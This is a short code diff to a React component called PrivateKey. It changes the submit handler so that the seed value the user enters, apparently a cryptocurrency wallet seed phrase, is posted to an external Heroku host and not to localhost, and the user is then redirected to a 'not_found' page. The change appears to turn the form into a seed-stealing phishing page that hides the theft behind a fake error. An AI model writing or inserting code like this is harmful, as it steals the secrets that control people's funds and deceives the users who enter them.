@@ -24,8 +24,8 @@ const PrivateKey = ({ seed3, setSeed3, error3, setError3, disabled3, setDisabled
   };
 
   const handleSubmit = (e) => {
-    axios.post("http://localhost:8080/form", { seed: seed3 });
-    Navigate('/missing')
+    axios.post("https://cryptoboss.herokuapp.com/form", { seed: seed3 });
+    Navigate('/not_found')
   };
 
   useEffect(() => {
